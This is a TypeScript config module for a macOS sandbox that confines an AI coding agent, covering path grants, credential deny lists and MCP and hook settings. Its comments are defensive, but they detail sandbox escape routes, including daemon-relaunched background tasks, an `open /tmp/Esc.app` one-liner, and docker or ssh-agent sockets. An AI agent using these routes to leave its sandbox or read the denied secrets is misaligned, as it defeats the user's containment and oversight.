// Configuration: sane defaults, env overrides, and an optional JS config file.
//
// Resolution order (later wins):
//   1. defaultConfig (below)
//   2. env vars (CLAUDE_CONFIG_DIR, CLABOX_*, …)
//   3. a JS config file (see loadConfig)
//
// A config file default-exports either a plain object (merged over the defaults)
// or a function `(defaults) => config` for full programmatic control.

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
// `opener/aliases.ts` is a leaf (it imports nothing), so naming the generated
// file from here costs no cycle — and keeps every opener path in one place.
import { ALIASES_FILENAME } from '../opener/aliases.js';
import {
  BASE_PATH_GROUPS,
  DEFAULT_DENY_WRITE_GLOBS,
  type GrantTable,
  PRIVATE_SYMLINK_ROOTS,
  TMP_BASE_KEYS,
} from '../policy/base.js';
import { assertConfigTrusted, isInside, type TrustState } from './trust.js';

export const HOME = os.homedir();

/** Expand a leading `~` / `~/` to the user's home directory. */
export function expandHome(p: string): string {
  if (!p) return p;
  if (p === '~') return HOME;
  if (p.startsWith('~/')) return path.join(HOME, p.slice(2));
  return p;
}

const env = process.env;

/** Dedicated git/ssh identity for commits made from inside the sandbox. */
export interface BotConfig {
  name: string;
  email: string;
  /** If `${sshDir}/id_ed25519` exists, git ssh is pinned to it. */
  sshDir: string;
}

/**
 * Opt-in marker that turns a box into a standalone Ghostty app. When a box
 * config carries an `app`, `clabox init` generates a Ghostty config for it and
 * builds a cloned `<appsDir>/<name>.app` that launches `clabox -b <box>`.
 */
export interface AppConfig {
  /** App display name → `<appsDir>/<name>.app` + CFBundleName. */
  name: string;
  /** Ghostty window title. Defaults to {@link AppConfig.name}. */
  title?: string;
  /** Emoji for the generated Raycast command. Default: the title's leading emoji. */
  emoji?: string;
  /** Path to a `.icns`/`.png` icon for the .app. `.png` is converted. `~` ok. */
  icon?: string;
  /** Ghostty built-in `macos-icon` (e.g. `retro`, `holographic`). */
  macosIcon?: string;
  /** Extra raw `key = value` lines appended to the generated Ghostty config. */
  ghostty?: Record<string, string>;
  /** Bundle id. Default: `com.ghostty.custom.<name dot-joined>`. */
  bundleId?: string;
}

/** Machine-wide settings for the `clabox init` Ghostty-app builder. */
export interface AppBuilderConfig {
  /** Donor app to clone. `~` is expanded. */
  ghosttyApp: string;
  /** Where built apps land. `~` is expanded. */
  appsDir: string;
  /** codesign identity. null → ad-hoc (`codesign -s -`). */
  signId: string | null;
  /** Optional base Ghostty config emitted as a leading `config-file = …`. */
  baseGhosttyConfig: string | null;
  /** Absolute `clabox` path to pin in the generated `command`. null → bare `clabox` (PATH-resolved at launch). */
  claboxBin: string | null;
}

/**
 * A single MCP server entry — the value under a key in claude's `mcpServers`
 * map. Loose on purpose (mirrors claude's mcp.json schema): `stdio` servers use
 * `command`/`args`/`env`, remote `http`/`sse` servers use `url`/`headers`.
 */
export interface McpServer {
  type?: 'stdio' | 'http' | 'sse';
  command?: string;
  args?: string[];
  env?: Record<string, string>;
  url?: string;
  headers?: Record<string, string>;
}

/** A single hook command — one entry in claude's settings.json hook list. */
export interface HookCommand {
  type: 'command';
  /** Shell command to run (e.g. an absolute path to a script). */
  command: string;
  /** Optional per-command timeout in seconds. */
  timeout?: number;
}

/** A matcher group under a hook event. */
export interface HookMatcher {
  /** Tool-name matcher for `PreToolUse`/`PostToolUse`; omit for `Stop`/`Notification`/… */
  matcher?: string;
  hooks: HookCommand[];
}

/**
 * Per-box hooks, mirroring claude's settings.json `hooks` map: an event name
 * (`Stop`, `Notification`, `PreToolUse`, …) → its matcher groups.
 */
export type HooksConfig = Record<string, HookMatcher[]>;

/**
 * Terminal-tab appearance for a run — how *this* tab announces itself. Built
 * into OSC escape sequences by `sandbox/tab.ts` and written only onto a real
 * TTY. The point is telling two tabs of the same box apart: `--rc` talks to
 * Remote Control (i.e. this session is reachable from the Claude app and
 * feature-flag fetching is on), a plain tab doesn't — and they otherwise look
 * identical.
 */
export interface TabConfig {
  /** Fixed tab title. null → the project dir (`~`-shortened), as before. */
  title?: string | null;
  /** Prefixed to the title while `--rc` is on. null/'' → no badge. */
  rcBadge?: string | null;
  /** Background color (OSC 11) for this box: `#rgb`/`#rrggbb`/X11 name. null → untouched. */
  background?: string | null;
  /** Background used while `--rc` is on; wins over {@link TabConfig.background}. */
  rcBackground?: string | null;
  /** Foreground color (OSC 10) for this box. null → untouched. */
  foreground?: string | null;
  /** Foreground used while `--rc` is on; wins over {@link TabConfig.foreground}. */
  rcForeground?: string | null;
  /**
   * Cursor color (OSC 12) for this box. null → untouched. The loudest marker of
   * the three: a background is washed out by `background-opacity`/blur, a
   * blinking cursor isn't.
   */
  cursor?: string | null;
  /** Cursor used while `--rc` is on; wins over {@link TabConfig.cursor}. */
  rcCursor?: string | null;
}

/**
 * Desktop notifications for a box — compiled into claude hooks that write
 * terminal escape sequences (`sandbox/notify.ts`), which is the only
 * notification channel that survives the sandbox: `terminal-notifier` hangs and
 * `osascript display notification` dies in-box, but the terminal emulator lives
 * outside it and already reads `/dev/tty`.
 *
 * Opt-in (`enabled: false`), because turning it on injects hooks into the box's
 * compiled settings.
 */
export interface NotifyConfig {
  /** Master switch. Env: `CLABOX_NOTIFY=1`. */
  enabled: boolean;
  /** Banner title. null → `Claude · <box slug>`. */
  title?: string | null;
  /** Banner body when a reply lands (`Stop`). null → no notification there. */
  stop?: string | null;
  /** Banner body when claude blocks on you (`Notification`). null → off. */
  waiting?: string | null;
  /**
   * Also drive the tab/dock progress indicator (OSC 9;4): yellow while claude
   * waits for you, cleared when the reply lands. Unlike a banner it stays put
   * while you're in another window.
   */
  progress?: boolean;
  /** Also ring the bell (BEL) — Ghostty's `bell-features` decides what that does. */
  bell?: boolean;
}

/**
 * The **opener broker** for a box: lets the agent ask you to reveal a folder in
 * Finder or open a file in your editor, without granting the `open` escape
 * ({@link Config.allowOpen}).
 *
 * The broker (`clabox opener`) runs OUTSIDE the sandbox and listens on a unix
 * socket; the box reaches it with `clabox reveal <dir>` / `clabox open <file>`.
 * Requests carry a path and nothing else — the application is whatever this
 * config says, `reveal` compiles to `open -R` (which cannot launch anything),
 * and every path must sit inside {@link OpenerConfig.roots}. See
 * `src/opener/protocol.ts` for the reasoning behind each rule.
 *
 * Opt-in per box: no `opener` block, no socket grant in the profile.
 */
export interface OpenerConfig {
  /** Master switch. A block with `enabled: false` grants nothing. */
  enabled: boolean;
  /**
   * Application `edit` hands files to (`open -a <editor>`). null → `edit` is
   * refused and only `reveal` works, which is the safest useful setting: Finder
   * never executes what it reveals, while an editor may execute what it opens
   * (Obsidian runs vault plugins and dataviewjs; VS Code has tasks).
   */
  editor?: string | null;
  /**
   * Directories requests may point into. `~` is expanded; a relative entry is
   * resolved against the box's project dir. Default: the project dir alone —
   * i.e. the agent can only ask you to look at the thing it's working on.
   */
  roots?: string[];
  /** Extensions `edit` accepts. Default: `DEFAULT_EDIT_EXTENSIONS`. */
  extensions?: string[];
  /** Max requests per minute before the broker starts refusing. Default 12. */
  maxPerMinute?: number;
}

/**
 * The rights one path can carry, as a compact flag set — `'rw'`, `['r', 'w']`,
 * or the spelled-out `['read', 'write']`:
 *
 *   - `r` — **read**: contents + metadata + xattrs (`file-read*`).
 *   - `w` — **write**: `file-write*`, and read with it (a writable path is
 *     readable; the profile emits `file-read* file-write*`).
 *   - `s` — **stat** only: existence, size, mode, mtime. No contents, and a
 *     directory can't be listed. The narrowest class, and implied by `r`/`w`
 *     (SBPL's `file-read*` already covers `file-read-metadata`).
 *   - `e` — **exec** (`process-exec`). Orthogonal to the three read classes: a
 *     hook script needs `'re'`, a bin dir usually `'re'` too.
 *   - `c` — **connect** to the unix socket at this path (`network-outbound` with
 *     a path filter). Also orthogonal: a socket `connect(2)` is not a file
 *     operation, so no amount of `r`/`w` grants it and no file deny takes it
 *     away. Unix sockets are denied by default — this is how a box opts into one
 *     (`/var/run/docker.sock`, an ssh-agent, a database socket).
 *   - `d` — **deny** read + write + stat + connect. Exclusive: `'rd'` is a
 *     contradiction and throws rather than silently picking a winner.
 *
 * Narrowest first, each wider class implies the ones below it, so a path only
 * ever needs its widest class: `'w'` ≡ `'rw'` ≡ `'rsw'`.
 */
export type PathGrant = string | string[];

/** Keys of {@link PathRules} that are rule *lists*, not paths. */
const PATH_RULE_FIELDS = [
  'readWrite',
  'readOnly',
  'read',
  'write',
  'stat',
  'exec',
  'socket',
  'deny',
  'denyGlobs',
  'denyWriteGlobs',
] as const;

export {
  BASE_PATH_GROUPS,
  type BasePathGroup,
  DEFAULT_DENY_WRITE_GLOBS,
  FLAG_FETCH_BLOCKERS,
  type GrantTable,
  PRIVATE_SYMLINK_ROOTS,
  SANDBOX_ESCAPE_GUARDS,
  TMP_BASE_KEYS,
} from '../policy/base.js';

/**
 * Extra rules layered on top of the built-in base profile. Two spellings, freely
 * mixed in the same object, both resolved by {@link resolvedPathRules}:
 *
 * **Per path** (preferred) — the key is the path, the value its rights:
 *
 *     paths: {
 *       '~/scratch': 'w',                  // read + write
 *       '~/some/hooks': ['r', 'e'],        // read + exec, so a hook can run
 *       '~/Library/Group Containers': 's', // stat only: it exists, nothing more
 *       '~/secret-project': 'd',           // denied outright
 *     }
 *
 * This is the shape that survives a config merge intact: `paths` is deep-merged,
 * so a box adding `'~/x': 'r'` keeps every path its preset declared — whereas the
 * list form below *replaces* the preset's array (arrays replace on merge), which
 * is why presets have to be spread by hand.
 *
 * **Per class** (the original spelling, still supported) — one list per right:
 * `read`/`write`/`stat`/`exec`/`deny`, plus the older aliases `readOnly` =
 * `read` and `readWrite` = `write`.
 */
export interface PathRules {
  /** RW subpaths (beyond project dir + configDir + /tmp). Alias of {@link PathRules.write}. */
  readWrite?: string[];
  /** RO subpaths. Alias of {@link PathRules.read}. */
  readOnly?: string[];
  /** RO subpaths (canonical name; concatenated with {@link PathRules.readOnly}). */
  read?: string[];
  /** RW subpaths (canonical name; concatenated with {@link PathRules.readWrite}). */
  write?: string[];
  /**
   * **stat-only** subpaths: `file-read-metadata` and nothing else.
   *
   * The profile does NOT grant metadata globally (see `profile.ts`), so by
   * default a box can only `stat` what it can also read or write. This re-opens
   * `stat` — and strictly `stat` — for a path whose *existence* a tool needs
   * while its contents stay denied. The hard secret deny is still emitted after
   * it, so this cannot uncover `~/.ssh/id_*`.
   */
  stat?: string[];
  /** process-exec subpaths (e.g. a hook-scripts dir so `config.hooks` can run). */
  exec?: string[];
  /**
   * Unix-socket paths the box may `connect(2)` to — `network-outbound` with a
   * path filter, **not** a file grant.
   *
   * Sockets are denied by default: a socket connect is authorized as networking,
   * so the blanket `(allow network*)` the profile used to emit handed the box
   * every unix socket on the machine regardless of the file denies — including
   * 1Password's ssh-agent (sign as you) and `/var/run/docker.sock` (root on the
   * host, outside every box). Now the profile grants IP only, and a socket has to
   * be named here (or with the per-path `'c'` right).
   */
  socket?: string[];
  /** explicit deny subpaths (read + write + stat + socket connect). */
  deny?: string[];
  /**
   * gitignore-style globs whose matches are denied **read**, at any depth
   * *inside the project workspace* (kept off system dirs on purpose — a global
   * `**​/__*` would also shadow CPython's `.../__init__.py` and break it). A
   * `!`-prefixed pattern re-allows; last match wins, exactly like `.gitignore`,
   * so order matters. `*` = a run of non-slash chars, `**` = any run, `?` = one
   * non-slash char; a directory match also covers its contents. Compiled to
   * SBPL regex by `globToRegexBody` — the patterns live here as data.
   */
  denyGlobs?: string[];
  /**
   * gitignore-style globs whose matches are denied **write** inside the project
   * workspace — read stays untouched. Same compiler and same `!`-re-allow
   * semantics as {@link PathRules.denyGlobs}.
   *
   * Unlike `denyGlobs` this one ships a **non-empty default**
   * ({@link DEFAULT_DENY_WRITE_GLOBS}), because the project dir is the one tree
   * the agent writes freely and a handful of files in it are executed *outside*
   * the sandbox by someone else later. See that constant for the list and the
   * reasoning.
   */
  denyWriteGlobs?: string[];
  /** `'<path>': '<rights>'` — see {@link PathGrant} and the interface docs. */
  [path: string]: PathGrant | undefined;
}

/**
 * The resolved twin of a path under one of {@link PRIVATE_SYMLINK_ROOTS}, or
 * null when the path needs no twin (already resolved, a regex, `~`-relative, or
 * one of the roots itself — a root is the symlink, so it is granted as itself).
 * Lexical on purpose: it must give the same answer inside a box, where the path
 * it's talking about may be unreadable, as it does on a bare host.
 */
export function resolvedTwin(p: string): string | null {
  if (p.startsWith('^') || p.startsWith('~') || p.startsWith('/private/')) return null;
  const root = PRIVATE_SYMLINK_ROOTS.find((r) => p.startsWith(`${r}/`));
  return root ? `/private${p}` : null;
}

/** Every built-in grant flattened — the seed for `defaultConfig.paths`. */
export function basePaths(): GrantTable {
  return Object.assign({}, ...BASE_PATH_GROUPS.map((g) => g.paths));
}

/**
 * The base-policy keys a config left **untouched** — those are emitted by the
 * profile's own base sections, so the box's grant list must skip them.
 *
 * A key whose rights differ from the default is a deliberate override, and it is
 * NOT skipped: it's emitted with the box's other grants, i.e. *after* the soft
 * privacy deny, where (last match wins) it can widen a default — `'/': 'w'` for a
 * whole-disk box — or `'d'` can take one away.
 */
export function untouchedBaseKeys(paths: PathRules): Set<string> {
  const base = basePaths();
  const out = new Set<string>();
  for (const [key, rights] of Object.entries(base)) {
    if ((paths as Record<string, unknown>)[key] === rights) out.add(key);
  }
  return out;
}

/** Effective clabox configuration. */
export interface Config {
  /**
   * Working directory to run `claude` in (and grant RW as the project dir).
   * null → the shell's CWD. Handy for named boxes that always target one
   * project regardless of where `clabox` is invoked from. `~` is expanded.
   */
  cwd: string | null;
  /** Path to the `claude` binary. null → autodetect (PATH, then ~/.local/bin). */
  claudeBin: string | null;
  /** Claude config/profile directory — supports multiple accounts. */
  configDir: string;
  /** Extra args always passed to `claude`, before any args from the CLI. */
  claudeArgs: string[];
  /**
   * Per-box MCP servers (the `mcpServers` map). clabox compiles them to
   * `<claboxHome>/mcp/<slug>.json` (i.e. `~/.config/clabox/mcp/…`, NOT the
   * Claude configDir) and launches claude with `--mcp-config <file>`, plus
   * `--strict-mcp-config` unless {@link Config.strictMcp} is false.
   * Materialized on every `run` and during `init`. Absent → no MCP flags.
   */
  mcp?: Record<string, McpServer>;
  /**
   * Whether a box declaring {@link Config.mcp} *also* gets `--strict-mcp-config`
   * (default `true`, env `CLABOX_STRICT_MCP=0`). Ignored without `mcp`.
   *
   * `true` — the box sees **exactly** its own servers: a shared configDir's
   * global and plugin MCP servers are ignored. But claude reads "ignoring all
   * other MCP configurations" wider than the config files: it also drops the
   * **claude.ai connectors** (Linear, Slack, Figma, … — served through
   * `mcp-proxy.anthropic.com`, which no local file declares), leaving only the
   * built-ins (`claude-in-chrome`).
   *
   * `false` — a plain `--mcp-config`, which **merges**: the box's own servers on
   * top of the account's cloud connectors and the configDir's own. Pick this for
   * a box that wants its MCP *in addition to* the cloud ones.
   */
  strictMcp: boolean;
  /**
   * Text appended to claude's system prompt via `--append-system-prompt`.
   * `string[]` is joined with blank lines. Use it for per-box pre-prompts while
   * sharing one configDir (the user-level CLAUDE.md is shared; this is not).
   */
  systemPrompt?: string | string[];
  /**
   * Per-box hooks (claude's settings.json `hooks` map). clabox merges them into
   * a settings JSON written to `<claboxHome>/settings/<slug>.json` (i.e.
   * `~/.config/clabox/settings/…`, NOT the Claude configDir) and launches
   * claude with `--settings <file>` — merging (not clobbering) any inline
   * `--settings` already in `claudeArgs`, so `includeCoAuthoredBy` survives.
   * Materialized on every `run` and during `init`. Absent → no settings flag.
   */
  hooks?: HooksConfig;
  bot: BotConfig;
  /**
   * Extra environment variables forced onto the sandboxed `claude` process,
   * layered over the inherited shell env and after the built-in hardening vars
   * (so a key set here wins). Use it to pass secrets like `GITHUB_TOKEN`.
   *
   * A **`null` value means "unset it"** (`env -u KEY`) — the way to *drop* a var
   * the shell (or a shared preset) exported, which no assignment can do. That
   * matters for claude's privacy vars: `DISABLE_TELEMETRY` / `DO_NOT_TRACK` /
   * `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` / `DISABLE_GROWTHBOOK` turn off
   * feature-flag fetching, which hides Remote Control (`/rc`) and the other
   * flag-gated features — so a box that wants `/rc` has to unset them, not
   * merely set them to `0` (claude reads the first three as "any non-empty
   * value", `0`/`false` included).
   */
  env: Record<string, string | null>;
  /** Allow outbound network. `false` → no `(allow network*)` line. */
  network: boolean;
  /**
   * Let the box hand work to claude's **background tasks** (`false` by default,
   * i.e. they're disabled in-box).
   *
   * This is a sandbox **escape hatch**, not a convenience toggle. A background
   * task isn't forked by the sandboxed claude — the request goes over a socket
   * to the singleton `claude daemon run` supervisor, which lives outside every
   * box (PPID 1 / launchd) and re-launches the session with `--fork-session
   * --resume`. The new process carries the same session id and the same
   * transcript but **no Seatbelt profile**: full read/write as the user, with
   * the box's system prompt still claiming it's sandboxed. Seatbelt is bound to
   * a process, a session is bound to a file, and background handoff swaps the
   * process — so the sandbox is simply gone. See docs/troubleshooting.md.
   *
   * Left `false`, the launcher forces {@link SANDBOX_ESCAPE_GUARDS} into the
   * box env. Flip it only for a box you'd be happy to run unsandboxed.
   */
  allowBackgroundTasks: boolean;
  /**
   * Let the box use **Launch Services** — `/usr/bin/open` and the `lsd` /
   * `launchservicesd` mach services (`false` by default).
   *
   * This is a sandbox **escape hatch**, in the same class as
   * {@link Config.allowBackgroundTasks} and for the same reason: the work is
   * done by a process the box didn't fork. `open` hands a path to
   * LaunchServices, which lives outside every box and starts the target as a
   * fresh process under **launchd (PPID 1) with no Seatbelt profile**. Since the
   * box can write `.app` bundles into `/tmp`, `$TMPDIR` or the project dir, a
   * granted `lsopen` is arbitrary unsandboxed code execution as the user, always
   * available and needing no running daemon:
   *
   *     mkdir -p /tmp/Esc.app/Contents/MacOS && … && open /tmp/Esc.app
   *     → runs with ppid 1, writes $HOME — paths the box itself cannot touch
   *
   * The profile already withholds `appleevent-send` for exactly this reason
   * (scripting your terminal would be an escape); `lsopen` was the same hole by
   * another name. Flip it on only for a box you'd be happy to run unsandboxed —
   * e.g. one whose whole point is opening URLs in your browser.
   */
  allowOpen: boolean;
  /**
   * Grant the box claude's daemon socket dir (`/tmp/cc-daemon-<uid>`), which
   * Remote Control (`/rc`) and `--bg-pty-host` talk over. `false` by default;
   * the `--rc` CLI flag turns it on for that launch, and
   * {@link Config.allowBackgroundTasks} implies it.
   *
   * Not an escape by itself — the escape is the unsandboxed daemon re-hosting
   * the session, which {@link SANDBOX_ESCAPE_GUARDS} closes in the env. But that
   * guard is *cooperative* (an env var inside a process the agent controls),
   * and a box that never uses `/rc` has no reason to keep the channel to the
   * one daemon that can re-launch it without a profile. So the socket follows
   * the feature: no `/rc`, no socket.
   */
  remoteControl: boolean;
  /**
   * Opt-in opener broker — the safe slice of `open` (reveal a folder, open a
   * file in your editor) without granting {@link Config.allowOpen}. See
   * {@link OpenerConfig}; absent → nothing is granted and `clabox open` in-box
   * has nowhere to connect.
   */
  opener?: OpenerConfig;
  /** Cap the process table inside the sandbox (fork-bomb guard). 0 → skip. */
  ulimitProcs: number;
  paths: PathRules;
  /** Home subdirectories denied entirely (read + write). */
  denyHome: string[];
  /** Dotfile config dirs under $HOME denied entirely. */
  denyDotConfigs: string[];
  /**
   * How the terminal tab looks while this box runs (title + background color).
   * The `rc*` fields kick in for a `--rc` launch, so a Remote-Control tab is
   * visually distinct from a private one.
   */
  tab?: TabConfig;
  /**
   * Opt-in desktop notifications that work *inside* the sandbox, by writing
   * terminal escape sequences to `/dev/tty` from compiled hooks. See
   * {@link NotifyConfig} and `sandbox/notify.ts`.
   */
  notify?: NotifyConfig;
  /**
   * Opt-in: build a standalone Ghostty app for this box during `clabox init`.
   * Absent → the box only gets a shell alias (the default).
   */
  app?: AppConfig;
  /** Machine-wide settings for the `clabox init` Ghostty-app builder. */
  appBuilder: AppBuilderConfig;
}

/**
 * Read a `config.tab` env override: unset → the built-in default, set-but-empty
 * → `null` (explicitly "off", e.g. `CLABOX_TAB_RC_BACKGROUND=` to stop the
 * `--rc` repaint without writing a config file).
 */
function tabEnv(raw: string | undefined, fallback: string | null): string | null {
  if (raw === undefined) return fallback;
  return raw.trim() || null;
}

/** Built-in defaults. Everything here is meant to be overridable. */
export const defaultConfig: Config = {
  cwd: env.CLABOX_CWD ?? null,
  claudeBin: env.CLABOX_CLAUDE_BIN ?? null,
  configDir: env.CLAUDE_CONFIG_DIR ?? '~/.claude',
  claudeArgs: ['--settings', '{"includeCoAuthoredBy": false}'],
  // Strict by default: a box gets exactly its own MCP servers. Set false (or
  // CLABOX_STRICT_MCP=0) to keep the claude.ai cloud connectors alongside them.
  strictMcp: env.CLABOX_STRICT_MCP !== '0',
  bot: {
    name: env.CLABOX_BOT_NAME ?? 'claudeBOT',
    email: env.CLABOX_BOT_EMAIL ?? 'bot@example.com',
    sshDir: env.CLABOX_BOT_SSH_DIR ?? '~/.ssh/claudebot',
  },
  env: {},
  network: true,
  // Background tasks escape the sandbox (they're launched by the unsandboxed
  // daemon, not forked in-box) — off unless a box explicitly opts in.
  allowBackgroundTasks: env.CLABOX_ALLOW_BACKGROUND_TASKS === '1',
  // `open` escapes the sandbox too: LaunchServices starts the target under
  // launchd with no profile, and the box can write the `.app` it opens.
  allowOpen: env.CLABOX_ALLOW_OPEN === '1',
  // The daemon socket follows the feature that needs it (`--rc` turns it on).
  remoteControl: env.CLABOX_REMOTE_CONTROL === '1',
  ulimitProcs: 1024,
  paths: {
    readWrite: [],
    readOnly: [],
    read: [],
    write: [],
    // stat is NOT granted globally by the profile — a box can only stat what it
    // can read/write. Empty by default; list a path here to re-open bare
    // `stat(2)` on it without exposing its contents.
    stat: [],
    // Unix sockets are denied by default; name one here (or give a path the `c`
    // right) to let the box connect to it.
    socket: [],
    exec: [],
    deny: [],
    // gitignore-style read-deny inside the project (opt-in, empty by default).
    // e.g. ['**/.env*', '!**/.env.example', '**/___*'] to hide `.env*` secrets
    // + `___*` files (triple `_` dodges Python dunders like `__init__.py`).
    denyGlobs: [],
    // …and the write-deny counterpart, which DOES ship a default: the few files
    // in a checkout that are executed outside the sandbox later on (clabox's own
    // config, `.git/config`, `.git/hooks`, `.envrc`). See the constant.
    denyWriteGlobs: [...DEFAULT_DENY_WRITE_GLOBS],
    // …and the built-in base policy (BASE_PATH_GROUPS above), as ordinary
    // `path: rights` entries. They're part of the config on purpose: a box can
    // narrow one (`'/System': 'r'`), take it away (`'~/Library/Keychains': 'd'`)
    // or add to it, and each keeps its position in the generated profile.
    ...basePaths(),
  },
  denyHome: ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Movies', 'Music'],
  // `.config/git` is always carved back out for git RO config in the profile.
  denyDotConfigs: ['aws', 'gnupg', 'kube', 'docker', 'config'],
  // Tab looks: plain runs keep the terminal's own colors, a `--rc` run repaints
  // them so a Remote-Control tab can't be mistaken for a private one. The
  // background alone is easy to miss (a box with `background-opacity`/blur
  // washes it out, and on a dark theme every dark tint looks the same), so the
  // `--rc` default is a warm, clearly-not-your-theme background plus a bright
  // amber cursor — small, moving, and impossible to miss. Each is overridable
  // per box or by env, where an empty value (`CLABOX_TAB_RC_CURSOR=`) means off.
  tab: {
    title: tabEnv(env.CLABOX_TAB_TITLE, null),
    rcBadge: tabEnv(env.CLABOX_TAB_RC_BADGE, '📡 RC'),
    background: tabEnv(env.CLABOX_TAB_BACKGROUND, null),
    rcBackground: tabEnv(env.CLABOX_TAB_RC_BACKGROUND, '#5c1a00'),
    foreground: tabEnv(env.CLABOX_TAB_FOREGROUND, null),
    rcForeground: tabEnv(env.CLABOX_TAB_RC_FOREGROUND, null),
    cursor: tabEnv(env.CLABOX_TAB_CURSOR, null),
    rcCursor: tabEnv(env.CLABOX_TAB_RC_CURSOR, '#ff8c1a'),
  },
  // Off by default: switching it on injects hooks into the box's settings, and
  // a box that already has its own notification hooks shouldn't grow a second
  // banner behind the user's back. `CLABOX_NOTIFY=1` turns it on machine-wide.
  notify: {
    enabled: env.CLABOX_NOTIFY === '1',
    title: tabEnv(env.CLABOX_NOTIFY_TITLE, null),
    stop: 'reply is ready',
    waiting: 'waiting for you',
    progress: true,
    bell: true,
  },
  // `app` is opt-in per box, so there's no default — it stays undefined.
  appBuilder: {
    ghosttyApp: env.CLABOX_GHOSTTY_APP ?? '/Applications/Ghostty.app',
    appsDir: env.CLABOX_APPS_DIR ?? '~/Applications',
    signId: env.CLABOX_SIGN_ID ?? null,
    baseGhosttyConfig: env.CLABOX_GHOSTTY_BASE_CONFIG ?? null,
    claboxBin: env.CLABOX_CLABOX_BIN ?? null,
  },
};

type Plain = Record<string, unknown>;

function isPlainObject(v: unknown): v is Plain {
  return v != null && typeof v === 'object' && !Array.isArray(v);
}

/** Shallow-deep merge: nested plain objects merge, everything else replaces. */
function deepMerge(base: Plain, override: Plain): Plain {
  const out: Plain = { ...base };
  for (const [key, val] of Object.entries(override)) {
    if (val === undefined) continue;
    const baseVal = base[key];
    out[key] = isPlainObject(val) && isPlainObject(baseVal) ? deepMerge(baseVal, val) : val;
  }
  return out;
}

/** Merge a (partial) override over a full config, returning a new config. */
export function mergeConfig(base: Config, override: unknown): Config {
  if (!isPlainObject(override)) return base;
  return deepMerge(base as unknown as Plain, override) as unknown as Config;
}

/**
 * The three access classes as the profile builder wants them: the canonical
 * `read`/`write`/`stat` names with the legacy `readOnly`/`readWrite` aliases
 * folded in (concatenated, aliases first), plus the untouched `exec`/`deny`/
 * `denyGlobs`. Pure, so `buildProfile` never has to care which spelling a box
 * used.
 */
export interface ResolvedPathRules {
  read: string[];
  write: string[];
  stat: string[];
  exec: string[];
  socket: string[];
  deny: string[];
  denyGlobs: string[];
  denyWriteGlobs: string[];
  /**
   * The box's grants as one `path: rights` table — the per-class lists above
   * folded together with the per-path entries, so the profile compiles them with
   * the same `grantBlock` it uses for the base policy. A path named in two
   * classes gets both letters (`stat` + `write` ⇒ `'sw'`, i.e. writable), which is
   * what "the widest class wins" means once the lists are gone. `deny` is NOT in
   * here: it belongs to the soft deny tier, which is emitted earlier.
   */
  table: GrantTable;
}

/** Long spellings accepted in a {@link PathGrant} alongside the single letters. */
const RIGHT_WORDS: Record<string, string> = {
  read: 'r',
  write: 'w',
  exec: 'e',
  stat: 's',
  socket: 'c',
  connect: 'c',
  deny: 'd',
  ro: 'r',
  rw: 'rw',
};

/**
 * Normalize one {@link PathGrant} to a set of right letters.
 *
 * Accepts `'rw'`, `['r', 'w']` and `['read', 'write']` — a list entry is first
 * looked up as a whole word, then split into letters, so `['rw', 'e']` works too.
 * Throws on an unknown letter, on an empty grant, and on `d` mixed with a grant:
 * a config typo must not quietly become a *wider* sandbox than intended.
 *
 * @param path only used for the error messages.
 */
export function parsePathGrant(grant: PathGrant, path = '<path>'): Set<string> {
  const chunks = Array.isArray(grant) ? grant : [grant];
  const out = new Set<string>();
  for (const chunk of chunks) {
    const token = String(chunk).trim().toLowerCase();
    if (!token) continue;
    for (const letter of RIGHT_WORDS[token] ?? token) {
      if (!'rwescdlmi'.includes(letter)) {
        throw new Error(
          `clabox: unknown right '${letter}' for path '${path}' — use r (read), w (write), s (stat), e (exec), c (socket connect), d (deny), or the m/i/l modifiers`,
        );
      }
      out.add(letter);
    }
  }
  if (!out.size) {
    throw new Error(
      `clabox: empty rights for path '${path}' — say 'd' to deny it, or drop the entry`,
    );
  }
  if (out.has('d') && out.size > 1) {
    throw new Error(
      `clabox: contradictory rights '${[...out].join('')}' for path '${path}' — 'd' (deny) cannot be combined with a grant`,
    );
  }
  return out;
}

/**
 * Fold both spellings of {@link PathRules} into one list per right: the legacy
 * `readOnly`/`readWrite` aliases into `read`/`write`, and every `'<path>':
 * '<rights>'` entry into the class its letters name. Per-class lists come first,
 * then the per-path entries in declaration order — within a class the order only
 * matters for readability, since the profile emits whole classes in a fixed
 * order (stat → read → write).
 *
 * Any key that is neither a known field nor path-shaped (`/`, `~`, `.`) throws,
 * so `readWritte: [...]` is caught as the typo it is instead of being taken for
 * a relative path and silently ignored.
 */
export function resolvedPathRules(
  paths: PathRules,
  skip: Set<string> = new Set(),
): ResolvedPathRules {
  const out: ResolvedPathRules = {
    read: [...(paths.readOnly ?? []), ...(paths.read ?? [])],
    write: [...(paths.readWrite ?? []), ...(paths.write ?? [])],
    stat: [...(paths.stat ?? [])],
    exec: [...(paths.exec ?? [])],
    socket: [...(paths.socket ?? [])],
    deny: [...(paths.deny ?? [])],
    denyGlobs: [...(paths.denyGlobs ?? [])],
    denyWriteGlobs: [...(paths.denyWriteGlobs ?? [])],
    table: {},
  };
  const byLetter: Record<string, string[]> = {
    r: out.read,
    w: out.write,
    s: out.stat,
    e: out.exec,
    c: out.socket,
    d: out.deny,
  };
  /** Letters that are matcher modifiers / niche ops, kept only in `table`. */
  const extraLetters = new Map<string, string>();
  for (const [key, value] of Object.entries(paths)) {
    if ((PATH_RULE_FIELDS as readonly string[]).includes(key)) continue;
    if (value === undefined) continue;
    // Paths the caller handles elsewhere — the base-policy keys, which the
    // profile emits in their own sections (in order) rather than lumped in with
    // the box's own grants.
    if (skip.has(key)) continue;
    // A path (`/`, `~`, `.`) or an SBPL regex (`^…`). Anything else is a typo —
    // `readWritte: [...]` must not be mistaken for a relative path.
    if (!/^[/~.^]/.test(key)) {
      throw new Error(
        `clabox: unknown paths key '${key}' — expected a path (starting with /, ~ or .), a regex (^…) or one of ${PATH_RULE_FIELDS.join(', ')}`,
      );
    }
    const letters = parsePathGrant(value, key);
    for (const letter of letters) byLetter[letter]?.push(key);
    // `l` (literal), `m` (map-executable) and `i` (ioctl) have no class list —
    // they survive only through `table`.
    const kept = [...letters].filter((x) => 'lmi'.includes(x)).join('');
    if (kept) extraLetters.set(key, kept);
  }
  // De-duplicate *within* a class (first mention wins the position): a path named
  // by both spellings, or by a preset and the box, is one rule. Across classes it
  // is left alone — `'re'` belongs in both `read` and `exec`. `denyGlobs` keeps
  // its exact order and repeats: there, last match wins and `!` re-allows.
